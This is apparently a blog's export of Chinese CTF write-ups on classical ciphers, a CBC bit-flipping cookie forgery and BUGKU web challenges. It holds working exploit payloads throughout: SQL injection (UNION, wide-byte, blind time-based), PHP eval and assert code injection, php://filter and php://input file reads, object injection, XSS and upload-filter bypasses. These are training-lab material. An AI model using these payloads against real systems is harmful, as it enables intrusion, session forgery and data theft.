unicode解码\n\tcipher2 = bytes(plain,encoding='utf-8')\n\tplain2 = cipher2.decode('unicode-escape')\n\t\n\t# ascii解码\n\tcipher3 = re.findall(r'[0-9]{2,}',plain2)\n\tplain3 = ''\n\tfor i in cipher3:\n\t\tplain3 += chr(int(i))\n\n\t# unicode解码\n\tcipher4 = re.findall(r'#x([0-9a-f]+)',plain3)\n\tplain4 = []\n\tfor i in cipher4:\n\t\tplain4.append(int(i,16))\n\n\t# ascii解码\n\tcipher5 = plain4\n\tplain5 = ''\n\tfor i in cipher5:\n\t\tplain5 += chr(i)\n\n\t# unicode\n\tcipher6 = re.findall(r'&#([0-9]{2,})',plain5)\n\tplain6 = ''\n\tfor i in cipher6:\n\t\tplain6 += chr(int(i))\n\n\t# urldecode\n\tprint(parse.unquote(plain6))\n```\n\n## '!?\n\n看了别人的wp，这题还是Ook!语言跑一下\n\n## +[]-\n\nbrainfuck语言跑一下\n\n## 奇怪的密码\n\n其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了\n\n```python\ncipher = 'gndk€rlqhmtkwwp}z'\nplain = ''\nseq = 1\nfor i in cipher:\n\tif i == '€':     # 该字符为非法字符，不去掉的话可能会报错\n\t\tseq += 1\n\t\tcontinue\n\tplain += chr((ord(i) - seq))\n\tseq += 1\nprint(plain)\n```\n\n## 托马斯杰斐逊\n\n根据提示可知是杰斐逊圆盘加密，附上解密脚本\n\n```python\ntomas = '''ZWAXJGDLUBVIQHKYPNTCRMOSFE\nKPBELNACZDTRXMJQOYHGVSFUWI\nBDMAIZVRNSJUWFHTEQGYXPLOCK\nRPLNDVHGFCUKTEBSXQYIZMJWAO\nIHFRLABEUOTSGJVDKCPMNZQWXY\nAMKGHIWPNYCJBFZDRUSLOQXVET\nGWTHSPYBXIZULVKMRAFDCEONJQ\nNOZUTWDCVRJLXKISEFAPMYGHBQ\nQWATDSRFHENYVUBMCOIKZGJXPL\nWABMCXPLTDSRJQZGOIKFHENYVU\nXPLTDAOIKFZGHENYSRUBMCQWVJ\nTDSWAYXPLVUBOIKZGJRFHENMCQ\nBMCSRFHLTDENQWAOXPYVUIKZGJ\nXPHKZGJTDSENYVUBMLAOIRFCQW\n'''\nnew_tomas = []\ntmp = ''\nfor i in range(len(tomas)):\n\tif tomas[i] == '\\n':\n\t\tnew_tomas.append(tmp)\n\t\ttmp = ''\n\telse:\n\t\ttmp += tomas[i]\nkey =  [2,5,1,3,6,4,9,7,8,14,10,13,11,12]\ncipher = 'HCBTSXWCRQGLES'\nfor index in range(len(cipher)):\n\tfor p in range(26):\n\t\tif new_tomas[key[index]-1][p] == cipher[index]:\n\t\t\tnew_tomas[key[index]-1] = new_tomas[key[index]-1][p:] + new_tomas[key[index]-1][:p]\n\t\t\tbreak\n\nfor item in key:\n\tprint(new_tomas[item-1][-6:]+new_tomas[item-1][:-6])   # 让输出更明显一点\n```\n\n输出如下\n\n> XMJQOYHGVSFUWIKPBELNACZDTR\nSGJVDKCPMNZQWXYIHFRLABEUOT\nXJGDLUBVIQHKYPNTCRMOSFEZWA\nSJUWFHTEQGYXPLOCKBDMAIZVRN\nBFZDRUSLOQXVETAMKGHIWPNYCJ\nUKTEBSXQYIZMJWAORPLNDVHGFC\nGJXPLQWATDSRFHENYVUBMCOIKZ\nKMRAFDCEONJQGWTHSPYBXIZULV\nUTWDCVRJLXKISEFAPMYGHBQNOZ\nAOIRFCQWXPHKZGJTDSENYVUBML\nDSRJQZGOIKFHENYVUWABMCXPLT\nMCSRFHLTDENQWAOXPYVUIKZGJB\nIKFZGHENYSRUBMCQWVJXPLTDAO\nNMCQTDSWAYXPLVUBOIKZGJRFHE\n\n好像默认是按照第7位来当做密文，所以我特地按照这个格式来，那么第一列就是明文了，注意flag要求小写。\n\n## zip伪加密\n\n已经说了是zip伪加密，直接16进制修改一下即可\n\n## 告诉你个秘密(ISCCCTF)\n\n看字符串像16进制，转成字符串可以看到像base64，再解码一次\n\n```\nr5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM\n```\n\n这是键盘对应的码\n\n```\nTONGYUAN\n```\n\n注意本题没有说明flag的提交方式，应该是 <code>flag:TONGYUAN</code>\n\n## 来自宇宙的信号\n\n既然说了是银河战队，直接百度搜 <code>银河 文字</code>，会看到第一个结果赫然是标准银河字母，对照一下就可以了。\n\n至此，所有加密题目OK。","tags":["CTF"],"categories":["writeup"]},{"title":"CBC字节翻转攻击","url":"/2018/03/23/CBC-Attack/","content":"\n# **前言**\n\n最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目[传送门](http://118.89.219.210:49168/index.php)。\n\n<!--more-->\n\n# **原理**\n\nCBC攻击方法的精髓在于通过损坏密文字节来改变明文字节，从而达到绕过过滤器或者提权等目的。贴一张图片\n\n![加密原理](CBC-Attack/1.png)\n\n> <font face=\"futura\">plaintext:</font>待加密的数据\n<font face=\"futura\">Ⅳ：</font>用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文\n<font face=“futura>Ciphertext：</font>加密后的数据\n\n**注意：**CBC工作于一个固定长度的比特组，称之为块(BLOCK)，本文中将使用16字节的块。\n\n**加密过程：**\n\n1.首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。\n2.生成一个随机的初始化向量(IV)和一个密钥。\n3.将IV和第一组明文异或。\n4.用密钥对3中xor后产生的密文加密。\n5.用4中产生的密文对第二组明文进行xor操作。\n6.用密钥对5中产生的密文加密。\n7.重复4-7，到最后一组明文。\n8.将IV和加密后的密文拼接在一起，得到最终的密文。\n\n从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：*前一块的密文用来产生后一块的密文*。\n\n**解密过程：**\n\n![解密过程](CBC-Attack/2.png)\n\n解密过程就是加密过程的逆过程\n\n1.从密文中提取出IV，然后将密文分组。\n2.使用密钥对第一组的密文解密，然后和IV进行xor得到明文。\n3.使用密钥对第二组密文解密，然后和2中的密文xor得到明文。\n4.重复2-3，直到最后一组密文。\n\n**攻击原理图**\n\n![攻击过程](CBC-Attack/3.png)\n\n这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。\n\n介绍一下异或的概念\n\n> 当我们的一个值C是由A和B异或得到 \nC = A XOR B \n那么 \nA XOR B XOR C很明显是=0的 \n当我们知道B和C之后，想要得到A的值也很容易 \nA = B XOR C \n因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。\n\n# **上手题目**\n\n存在目录泄露 <code>.index.php.swp</code>，会下载到一个源码，需要用vim恢复一下，使用下面的命令\n\n```\nvi -r {your file name} \n```\n\n然后用下面的命令删除swp文件，不然每一次编辑时总是有这个提示。 \n\n```\nrm .{your file name}.swp \n```\n\n再输入7即可恢复代码\n\n```php\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Login Form</title>\n<link href=\"static/css/style.css\" rel=\"stylesheet\" type=\"text/css\" />\n<script type=\"text/javascript\" src=\"static/js/jquery.min.js\"></script>\n<script type=\"text/javascript\">\n$(document).ready(function() {\n\t$(\".username\").focus(function() {\n\t\t$(\".user-icon\").css(\"left\",\"-48px\");\n\t});\n\t$(\".username\").blur(function() {\n\t\t$(\".user-icon\").css(\"left\",\"0px\");\n\t});\n\n\t$(\".password\").focus(function() {\n\t\t$(\".pass-icon\").css(\"left\",\"-48px\");\n\t});\n\t$(\".password\").blur(function() {\n\t\t$(\".pass-icon\").css(\"left\",\"0px\");\n\t});\n});\n</script>\n</head>\n\n<?php\ndefine(\"SECRET_KEY\", file_get_contents('/root/key'));\ndefine(\"METHOD\", \"aes-128-cbc\");\nsession_start();\n\nfunction get_random_iv(){\n    $random_iv='';\n    for($i=0;$i<16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\n\nfunction login($info){\n    $iv = get_random_iv();\n    $plain = serialize($info);\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);\n    $_SESSION['username'] = $info['username'];\n    setcookie(\"iv\", base64_encode($iv));\n    setcookie(\"cipher\", base64_encode($cipher));\n}\n\nfunction check_login(){\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\n            $_SESSION['username'] = $info['username'];\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\n\nfunction show_homepage(){\n    if ($_SESSION[\"username\"]==='admin'){\n        echo '<p>Hello admin</p>';\n        echo '<p>Flag is $flag</p>';\n    }else{\n        echo '<p>hello '.$_SESSION['username'].'</p>';\n        echo '<p>Only admin can see flag</p>';\n    }\n    echo '<p><a href=\"loginout.php\">Log out</a></p>';\n}\n\nif(isset($_POST['username']) && isset($_POST['password'])){\n    $username = (string)$_POST['username'];\n    $password = (string)$_POST['password'];\n    if($username === 'admin'){\n        exit('<p>admin are not allowed to login</p>');\n    }else{\n        $info = array('username'=>$username,'password'=>$password);\n        login($info);\n        show_homepage();\n    }\n}else{\n    if(isset($_SESSION[\"username\"])){\n        check_login();\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\">\n                <div id=\"wrapper\">\n                    <div class=\"user-icon\"></div>\n                    <div class=\"pass-icon\"></div>\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" />\n                        <input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" />\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n?>\nt\n</html>\n```\n\n一直也不行，心态崩了(2333333...)\n\n**************\n\n一个星期之后.....\n\n**************\n\n我胡汉三又回来了！！！！\n\n我们把返回的cipher值进行翻转，想要翻转第二块的 <code>m</code>为 <code>a</code>只需要把第一行对应第九位翻转一下即可，代码如下\n\n```python\nimport urllib.parse\nimport requests\nimport base64\n\niv = 'sDGucEcgR9ixzDNVm6IrpA%3D%3D'\ncipher_raw = 'xhp6%2B1A%2FKctfyU%2BbQeuRx3lUMrDUN%2FOuXg96c%2FJ%2Byn5DX2UVNMavsdocAGjmu6SmuRD6kY8Ef4rLKYADlEeUjQ%3D%3D'\nprint(\"[*]原始iv和cipher\")\nprint('翻转前：')\nprint('cipher_raw:',cipher_raw)\nprint('iv_raw:',iv)\nprint('翻转后：')\ntmp1 = urllib.parse.unquote(cipher_raw)\n\ncipher = base64.b64decode(tmp1)\n# a:2:{s:8:\"userna\n# me\";s:5:\"mdmin\";\n# s:8:\"password\";s\n# :6:\"123456\";}\n\ncipher = cipher.decode('unicode_escape')\nxor_cipher = cipher[0:9] + chr(ord(cipher[9]) ^ ord('m') ^ ord('a')) + cipher[10:]\nxor_cipher = urllib.parse.quote(base64.b64encode(xor_cipher.encode('latin-1')))\n\nprint(xor_cipher)\n```\n\n写完这个脚本，我心中又不禁对python的编码问题骂了无数次mmp，真的太多坑了.....\n\n然后修改cookie中的cipher值，刷新页面（注意此时不能提交数据,要把post数据清空）之后，页面会提示反序列化失败，这是因为我们修改mdmin为admin的时候，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了。因为程序中要求username要等于admin所以不能利用文章里的说的填充字符。 又因为是第一个块数据被破坏，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。 \n\n贴一下代码\n\n```python\n# 得到新的iv值\niv = 'sDGucEcgR9ixzDNVm6IrpA%3D%3D' # 填写未修改过的iv\ncipher = 'SjeC+xtTva24pYSPdWXIsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'  # 填写提示反序列化错误的字符串\ncipher = base64.b64decode(cipher).decode('unicode_escape')\nprint('cipher:',cipher)\niv = base64.b64decode(urllib.parse.unquote(iv))\niv = iv.decode('unicode_escape')\nnewIv = ''\nright = 'a:2:{s:8:\"userna'  # 被损坏前正确的明文\nfor i in range(16):\n    newIv += chr( ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i])) \nprint(urllib.parse.quote(base64.b64encode(newIv.encode('latin-1'))))\n```\n\n将得到的iv替换cookie中的iv，刷新一下页面即可以admin身份登录获取flag。\n\n","tags":["CTF","Crypto"],"categories":["资料"]},{"title":"BUGKU-CTF题解","url":"/2018/03/12/bugkuwriteup/","content":"# 前言\n\n最近一段时间课比较少，做一做bugku的题目。[传送门](http://ctf.bugku.com/)\n\n<!--more-->\n\n# 杂项\n\n## 签到题\n加群即可\n\n## 这是一张单纯的图片\n\nhex一下之后得到 <code>&#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125;</code> ，Unicode解码即可(我这个是被解码后的)\n\n## 隐写\n\n改变高度即可得到flag，将7对应的第二行A4改为F4即可。\n\n## telnet\n\nwireshark跑一下然后追踪tcp流即可\n\n## 猜\n\ngoogle搜索图片可知那是刘亦菲(liuyifei)。\n\n## 流量分析（cnss）\n\n这个题目我觉得挺坑的，用wireshark分析一下，因为题目也没任何提示，而且包里面貌似是CSRF，所以就在往这上面想，但是也没什么收获，反正这题数据包少，就随手追踪了第一条碰碰运气，结果它的请求引起了我的注意：\n\n> GET /stat.htm?id=2724999&r=http%3A%2F%2Fspace.bilibili.com%2F17190571&lg=zh-cn&ntime=1490634009&cnzz_eid=418561883-1487085537-http%3A%2F%2Fwww.bilibili.com%2F&showp=1536x864&p=http%3A%2F%2Fspace.bilibili.com%2F17190571%2F%23!%2F&t=Chrstm%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4%20-%20%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%20(%20%E3%82%9C-%20%E3%82%9C)%E3%81%A4%E3%83%AD%20%E4%B9%BE%E6%9D%AF~%20Bilibil...&umuuid=15ab677e5a02ed-064c9a36304b67-27d1a36-144000-15ab677e5a4205b&h=1&rnd=1218637328 HTTP/1.1\n\n请求网址里面有个space.bilibili.com ，感觉这应该是某个用户的个人空间，尝试访问一下，结果就在个人空间里个性签名看到了熟悉的base64，解码两次即可得到flag。\n\n## 做个游戏(08067CTF)\n\n下载之后是个游戏，直接二进制反编译一下，结果在PlaneGameFrame类里面找到了flag，记得flag还得再base64解码一下。\n\n# Web\n\n## web2\n\n直接查看元素即可\n\n## 文件上传测试\n\nburpsuite抓包将图片文件改名为**<font face=\"futura\">2.png.php</font>**即可\n\n## 计算器\n\n直接计算即可，问题在于输入框只能输入以为数字，查看元素将最大长度改为3即可。\n\n## web基础$\\_GET\n\npayload <code>?what=flag</code>\t\n\n## web基础$\\_POST\n```\nwhat=flag\n```\n\n## 矛盾\n\n用%00截断即可**<font face=\"futura\">?num=1%00adf</font>**，原理是==比较时只是对值的比较，会把不同类型转为同类型之后再行比较\n\n## Web3\n\n阻止页面弹窗后查看元素，然后Unicode解码即可\n\n## sql注入\n\n查看元素发现是<font face=\"futura\">gb2312</font>的编码，测试<font face=\"futura\">?id=1%df'</font>则会报错，说明是宽字节注入，\npayload\n```\n?id=1%df' union select 1,string from sql5.key where id=1--+\n```\n\n## 域名解析\n\n直接在linux下打开hosts文件，输入下列文档\n> 120.24.86.145 flag.bugku.com\n\n我在部分linux下不能用，不知道是为什么。\n\n## sql注入1\n\n过滤了关键字，尝试用%00绕过 \n```\n?id=-1 uni%00on sele%00ct 1,hash fr%00om sql3.key wh%00ere id=1--+\n```\n\n## 你必须让他停下\n\n页面一直停不下来，尝试了禁用js文件，还是不行，尝试burpsuite构造参数多次抓包，然后查看返回页面里则可以得到flag。\n\n## 网站被黑\n\n题目给出提示 `这个题没技术含量但是实战中经常遇到` ,打开后发现也没有什么泄露的问题，所以猜测应该是后台弱口令之类的问题，扫描了一下目录，发现有个shell.php，是个后台马，尝试了几个弱口令都不行，最终尝试爆破了一下，得到密码。（提示一下密码是四位）。\n\n## 本地包含\n\n页面有代码泄露\n```php\n <?php\n    include \"waf.php\";\n    include \"flag.php\";\n    $a = @$_REQUEST['hello'];\n    eval( \"var_dump($a);\");\n    show_source(__FILE__);\n?> \n```\n\n**方法一**\n\n变量**<font face=\"futura\">request</font>**是一个http变量，可以接受post或者get和cookie的数组，代码中<code>eval( \"var_dump($a);\")</code>存在可以利用的漏洞，可以把所要得到的文件dump出来。构造参数\n```\n?hello=file_get_contents('flag.php')\n```\n浏览器php代码被截断，f12查看元素即可得到flag\n\n**方法二**\n\n其中第一句话**<font face=\"futura\">include \"flag.php\"</font>**可知文件包含在本地\n\n还是利用 <font face=\"futura\">eval()</font>函数，payload\n```\n1);print_r(file(\"./flag.php\"));%23\n```\n**<font face=\"futura\">%23</font>**的作用是注释掉eval函数后面的**<font face=\"futura\">\")</font>**形成闭合。\n\n## <font face=\"futura\">strcmp</font>比较字符串\n\n这个题目的问题在于PHP在5.3版本之前，对于字符串比较函数<font face=\"futura\">strcmp(p1,p2)</font>函数，如果p1>p2，返回**<font face=\"futura\">>0</font>**；如果p1=p2，返回**<font face=\"futura\">=0</font>**；如果p1 < p2，返回**<font face=\"futura\">&#60;0</font>**。但是如果传递到参数是个数组，那么函数会报错，则会<code>return 0</code>，相当于判断为p1=p2了。故payload为**<font face=\"futura\">?a[]=1</font>**。\n\n## 变量1\n\n本题考查可变变量，故payload为 <code>?args=GLOBALS</code>，这里这个$$GLOBALS只能在eval中使用，却不能直接var_dump出来，不知道是为什么。\n\n## web5\n\njspfuck查看代码，直接将代码扔进控制台即可\n\n## 头等舱\n\n抓包查看请求头即可\n\n## 管理员系统\n\n修改xff本地登录，之后查看源代码发现最后一行有一段base64内容，解码之后是 `test123` ，所以直接以这个作为密码登录试一下，然后就拿到了flag\n\n## web4\n\n查看源代码发现有url编码的文本，按照 <code>eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));</code>语句拼接url编码并转码可得\n```\nfunction checkSubmit(){\n\tvar a=document.getElementById(\"password\");\n\tif(\"undefined\"!=typeof a){\n\t\tif(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value)return!0;\n\t\talert(\"Error\");\n\t\ta.focus();\n\t\treturn!1\n\t}\n}\ndocument.getElementById(\"levelQuest\").onsubmit=checkSubmit;\n```\n查看代码可知将**<font fac=\"futura\">67d709b2b54aa2aa648cf6e87a7114f1</font>**提交即可。\n\n## flag在index里\n\n查看元素发现有<code>href=\"./index.php?file=show.php</code>语句，而题目又说flag在index里，所以应该是要查看index.php文件，burp抓包修改。payload\n\n> file=php://filter/convert.base64-encode/resource=index.php\n\n## 输入密码查看flag\n\n简答的弱口令爆破，密码13579\n\n## 点击一百万次\n\npost参数为1000000即可\n\n## 备份是个好习惯\n\n题目说了备份，查看index.php.bak可以下载到源码\n```php\n<?php\n/**\n * Created by PhpStorm.\n * User: Norse\n * Date: 2017/8/6\n * Time: 20:22\n*/\n\ninclude_once \"flag.php\";\nini_set(\"display_errors\", 0);\n$str = strstr($_SERVER['REQUEST_URI'], '?');\n$str = substr($str,1);\n$str = str_replace('key','',$str);\nparse_str($str);\necho md5($key1);\necho md5($key2);\nif(md5($key1) == md5($key2) && $key1 !== $key2){\n    echo $flag.\"取得flag\";\n}\n?>\n```\n阅读代码可知，提交两个md5值相等而本身值不相等的变量即可，同时还有变量guolv，双写绕过即可，这里提一下，这儿的 \t<code>REQUEST_URI</code>的输入方式{% raw %}www.xxx.com/aaa/ {% endraw %},那么**<font face=\"futura\">aaa</font>**就是REQUEST_URI。本题payload\n\n> /?kekeyy1[]=1&kekeyy2[]=2/\n\n## 成绩单\n\n常规的SQL注入\n```\nid=1' order by 4%23 #爆字段数\nid=-1' union select 1,database(),3,4%23\t#爆数据库名\nid=-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()%23 #爆表名\nid=-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='fl4g'%23 #爆字段名\nid=-1' union select 1,skctf_flag,3,4 from fl4g%23 \n```\n\n## 秋名山老司机\n\n这个题只能2秒内提交，所以写个脚本\n```\nimport requests\nimport re\n\n\nurl = \"http://120.24.86.145:8002/qiumingshan/\"\nr = requests.session()\ncontent = r.get(url).text\npar = re.findall(r'(.*?)=.*?',content)\ntext = par[1][5:]\nans = eval(text)\n\npayload = {'value':ans}\ncontent = r.post(url,data=payload).text\nprint(content)\n```\n\n## 速度要快\n\n这个题就是编程题，抓包就会发现有个flag值，被base64编码了，解之，然后查看元素\n\n>  OK ,now you have to post the margin what you find \n\n所以其实就是要提交margin值，但是这个题最骚的就是这个被base64解码后flag还需要在解码一次，也怪我，第一次解码后这个字符串倒是挺像base64的，怪我不够敏感，而且margin好像是css样式，应该解出数字才对。贴上代码\n```python\nimport requests\nimport base64\n\nurl = \"http://120.24.86.145:8002/web6/\"\nr = requests.session()\ncontent = r.get(url).headers['flag'].encode('utf-8')\ncontent = base64.b64decode(content)\ncontent = content.decode('utf-8')[15:]\ncontent = base64.b64decode(content)\npayload = {'margin':content}\nres = r.post(url,data=payload).text\nprint(res)\n```\n\n## COOKIE欺骗\n\n解码filename发现是<code>keys.txt</code>，base64编码<code>index.php</code>替换之，然后改变line的参数即可得到全部php文件进行代码审计，改变cookie为margin=margin，再把filename的值为keys.php(要base64编码)，然后就OK了\n\n## XSS\n\n这个题目是最简单的xss，所谓xss其实和sql注入差不多，这是xss用的是JavaScript语言，payload\n```\n?id=src=\"null\" onerror=\"alert(_key_)\"\\u003e\n```\n\n## never give up\n\n看到提示有1p.html，但是查看会跳转，用view-source查看即可，然后恢复代码\n```php\n<?php\nif(!$_GET['id'])\t//$_GET['id']为空时执行该语句\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\trequire(\"f4l2a3g.txt\");\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n?>\n```\n发现有个txt文件，不管别的，先看一下再说，结果直接出了flag，这应该是题目的漏洞。下面说正解\n查看代码，$a的绕过的话 <code>a=php://input</code>，然后post<code>bugku is a nice plateform!</code>，**<font face=\"futura\">$id==0</font>**的绕过话可以用\t<code>id=%00</code>绕过， <code>strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4</code>的绕过可以用**<font face=\"futura\">b=%00123456</font>**\n> 参看PHP手册可以知道**<font face=\"futura\">php://input</font>**是个可以访问请求的原始数据的只读流，一般用来获取POST请求。\n对于<font face=\"futura\">id</font>的处理有代码可知，如果提交id=0，那么前面 <font face=\"futura\">$\\_GET['id']</font>会被判断为空，无法从而使代码exit。所以可以用<code>id=00</code>或者<code>id=%00</code>绕过(字符串0在PHP中会被当做空值)\n函数<code>eregi()</code>现已被弃用，存在%00截断漏洞，读到<code>%00</code>的时候，判断就截止了。\n\n## welcome to bugkuctf\n\n访问元素发现源代码\n```php\n$user = $_GET[\"txt\"];  \n$file = $_GET[\"file\"];  \n$pass = $_GET[\"password\"];  \nif(isset($user)&&(file_get_contents($user,'r')===\"welcome to the bugkuctf\")){  \n    echo \"hello admin!<br>\";  \n    include($file); //hint.php  \n}else{  \n    echo \"you are not admin ! \";  \n}   \n```\ntext的绕过可以使用php的input协议流，file的话用PHP的filter过滤器即可\n```\n?txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php\n```\n读取到一段base64代码，解码得到PHP代码\n```\n<?php  \nclass Flag{//flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n\t\t\techo \"<br>\";\n\t\treturn (\"good\");\n        }  \n    }  \n}  \n?> \n```\n发现这是一个flag类，有个string方法，序列化即可使之执行。payload\n```\n?txt=php://input&file=hint.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n## 过狗一句话\n\n查看源代码可知已经构造了assert语句，这个对于我来说是一个新知识点。assert和eval类似，可以进行命令执行，只是eval参数为字符串，而assert参数则为函数或表达式。构造命令来执行\n<code>?s=var_dump(glob('\\*'))</code>\n\n> 函数<font face=\"futura\">glob(pattern，flag)</font>可以匹配所有符合条件的文件\n\n读取文件\n<code>?s=var_dump(file('./flag.txt'))</code>\n\n## 字符？正则？\n\n这个正则表达式后面我得好好学一下了，有点菜。靠着百度大概搞懂了，介绍一些\n> **<font face=\"futura\">[[:punct:]]</font>**为匹配任意字符，非字母和数字，**<font face=\"futura\">.\\*</font>**为匹配任意字符，**<font face=\"futura\">{m,n}</font>**为匹配字符m-n次，按照要求构造payload\n\n```\n?id=key.keyaaaaakey:/a/keya%\n```\n\n## 前女友(SKCTF)\n\n查看页面可知，是一段单身狗的诉说，查看元素发现竟然藏了一条链接，点击发现代码\n```\n<?php\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    $v3 = $_GET['v3'];\n    if($v1 != $v2 && md5($v1) == md5($v2)){\n        if(!strcmp($v3, $flag)){\n            echo $flag;\n        }\n    }\n}\n?>\n```\n\n很简单的绕过\n```\n?v1=240610708&v2=QNKCDZO&v3[]=1\n```\n\n## login1(SKCTF)\n\n看提示可知本题是SQL约束攻击，具体原理查看[传送门](http://blog.csdn.net/qq_32400847/article/details/54137747)，创建一个用户\n\n|用户名|admin                                                1|\n|:--:|:--:|\n|密码|Aa123456|\n\n注册成功后用<code>admin</code>为用户名， <code>Aa123456</code>登录即可\n\n```\nSKCTF{4Dm1n_HaV3_GreAt_p0w3R} \n```\n\n## 你从哪里来\n\n题目提示<font face=\"futura\">are you from google?</font>，我以为是说浏览器，但实际上是说**<font face=\"futura\">HTTP_REFERER</font>**，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。然后就是抓包发送即可，构造的referrer：\n```\nhttps://www.google.com\n```\n\n## <font face=\"futura\">md5 collision</font>\n\n这题是简单的md5哈希的比较\n```\n?a=240610708\n```\n\n## 各种绕过\n\n这题很简单，直接上payload\n```\n?id=margin&uname[]=1\npasswd[]=123\n```\n注意第二行为post数据。\n\n## web8\n\n代码审计与绕过\n```php\n<?php\nextract($_GET);\nif (!empty($ac))\n{\n$f = trim(file_get_contents($fn));\nif ($ac === $f)\n{\necho \"<p>This is flag:\" .\" $flag</p>\";\n}\nelse\n{\necho \"<p>sorry!</p>\";\n}\n}\n?>\n```\n要绕过的核心语句是<code>$ac===$f</code>，可以令 <code>ac=flag</code>，<code>fn</code>处使用之前说过的PHP的input协议，本题payload\n```\n?ac=flag&fn=php://input\n```\n再post数据\n```\nflag\n```\n\n## 细心\n\n看了一点提示，有点不好。这题一看页面没什么东西，随便尝试旁站robots.txt(就是这一步我没有做，唉，经验不足啊),扫描发现有个<code>resusl.php</code>页面，直接是<code>x=admin</code>即可(考验脑洞的时刻)\n\n## 求getshell\n\n对于getshell的题目做的不是很多，真的是有点迷。抓包更改后缀为 <code>php2,php4.php5</code>，测试发现php5可用，然后再把文件类型改一下\n\n> content-type: image/jpg\n\n还得改个东西\n\n> Content-Type: Multipart/form-data; boundary=---------------------------265001916915724 \n\n把第一个**<font face=\"futura\">m</font>**大写，有关介绍看个[链接](http://blog.csdn.net/five3/article/details/7181521),这种绕过有点冷门，再放个[链接2](https://www.tuicool.com/articles/vmuYz23?utm_medium=hao.caibaojian.com&utm_source=hao.caibaojian.com)\n\n*******************\n\n## INSERT INTO注入\n\n这个题又让我学到了新知识，还顺便加强了一波脚本编写，本题考察的是 **<font face=\"futura\">insert into注入</font>**，为什么存在注入呢\n\n查看源代码，发现\n```php\n$ip_arr = explode(',', $ip);\n```\n\n这句话一出， 说明<code>，</code>就被过滤了，所以这题是一道不能使用逗号的注入，而且报错什么的都不行，所以只能延时盲注。由于本题逗号被过滤了，所以if函数不能用了，在此**解锁一个新姿势**\n```\nselect substring((select user()) from 1 for 1);  #第一种方法\nselect substring((select user()) from -1);  #第二种方法\n```\n如此就可以不用逗号截取字符串\n\n对于判断条件，可以使用\n```\nselect case when (条件) then 代码1 else 代码 2 end \n```\n这个前面数据库有介绍。\n所以对于本题有两种payload：\n```\ninsert into xs values(12'+(select case when binary substr((select flag from flag) from 1 for 1)='e' then sleep(5) else sleep(0) end) and 'a'='a')\ninsert into xs values(12'+(select case when binary substr((select flag from flag) from -1)='e' then sleep(5) else sleep(0) end) and 